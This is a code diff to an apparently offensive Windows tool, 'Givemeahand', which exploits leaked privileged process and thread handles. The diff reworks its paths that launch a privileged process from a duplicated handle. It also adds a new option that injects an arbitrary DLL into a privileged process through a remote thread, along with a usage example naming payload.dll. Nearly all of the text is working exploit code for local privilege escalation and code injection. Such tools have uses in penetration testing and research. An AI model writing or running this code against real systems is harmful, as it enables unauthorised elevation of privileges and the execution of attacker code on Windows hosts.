@@ -46,7 +46,8 @@ void PrintUsage()
 		"\thttp://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
 		"\n"
 		"Example usage:\n"
-		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n";
+		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n"
+		"\t.\\Givemeahand --dll \"C:\\Users\\user\\payload.dll\"  (PROCESS_CREATE_THREAD path)\n";
 }
 
 void printHandleInfo(SYSTEM_HANDLE_TABLE_ENTRY_INFO& handle, const DWORD& integrityLevel)
@@ -135,40 +136,57 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 						{
 							vSysHandle.push_back(handle);
 							printHandleInfo(handle, integrityLevel);
-							if (args.count(L"--cmd")) {
-								if (handle.GrantedAccess & PROCESS_CREATE_PROCESS) {
-									HANDLE clHandle;
-									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-										std::cerr << "[-] CloneHandle failed";
-									}
-									DWORD privPid = CreatePrivProc(
-										&clHandle,
+							if (handle.GrantedAccess & PROCESS_CREATE_PROCESS && args.count(L"--cmd")) {
+								HANDLE clHandle;
+								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+									std::cerr << "[-] CloneHandle failed";
+								}
+								DWORD privPid = CreatePrivProc(
+									&clHandle,
+									(WCHAR*)args.find(L"--cmd")->second.c_str());
+								if (privPid == 0) {
+									std::cerr << "[-] CreatePrivProc failed";
+								}
+								else {
+									std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
+									return 0;
+								}
+							}
+							else if (handle.GrantedAccess & PROCESS_DUP_HANDLE && args.count(L"--cmd")) {
+								HANDLE clHandle;
+								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+									std::cerr << "[-] CloneHandle failed\n";
+								}
+								else {
+									DWORD privPid = ExploitDupHandle(
+										clHandle,
 										(WCHAR*)args.find(L"--cmd")->second.c_str());
+									CloseHandle(clHandle);
 									if (privPid == 0) {
-										std::cerr << "[-] CreatePrivProc failed";
+										std::cerr << "[-] ExploitDupHandle failed\n";
 									}
 									else {
 										std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
 										return 0;
 									}
 								}
-								else if (handle.GrantedAccess & PROCESS_DUP_HANDLE) {
-									HANDLE clHandle;
-									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-										std::cerr << "[-] CloneHandle failed\n";
+							}
+							else if (handle.GrantedAccess & PROCESS_CREATE_THREAD && args.count(L"--dll")) {
+								HANDLE clHandle;
+								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+									std::cerr << "[-] CloneHandle failed\n";
+								}
+								else {
+									DWORD tid = ExploitCreateThread(
+										clHandle,
+										(WCHAR*)args.find(L"--dll")->second.c_str());
+									CloseHandle(clHandle);
+									if (tid == 0) {
+										std::cerr << "[-] ExploitCreateThread failed\n";
 									}
 									else {
-										DWORD privPid = ExploitDupHandle(
-											clHandle,
-											(WCHAR*)args.find(L"--cmd")->second.c_str());
-										CloseHandle(clHandle);
-										if (privPid == 0) {
-											std::cerr << "[-] ExploitDupHandle failed\n";
-										}
-										else {
-											std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
-											return 0;
-										}
+										std::cerr << "[!] DLL injected via remote thread TID " << tid << "\n";
+										return 0;
 									}
 								}
 							}
